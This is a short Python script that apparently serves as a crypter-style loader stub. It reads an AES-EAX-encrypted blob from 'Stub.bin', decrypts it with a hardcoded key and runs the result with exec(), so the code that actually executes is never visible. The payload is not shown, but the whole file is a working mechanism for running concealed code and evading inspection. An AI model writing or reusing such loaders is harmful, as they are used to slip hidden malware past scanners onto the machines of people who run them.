from Crypto.Cipher import AES
import base64

key = b"dGhpc2lzdGhlc2VjcmV0a2V5"
with open("Stub.bin", "rb") as f:
    nonce = f.read(16)
    tag = f.read(16)
    ciphertext = f.read()

cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
data = cipher.decrypt_and_verify(ciphertext, tag)

exec(data.decode())

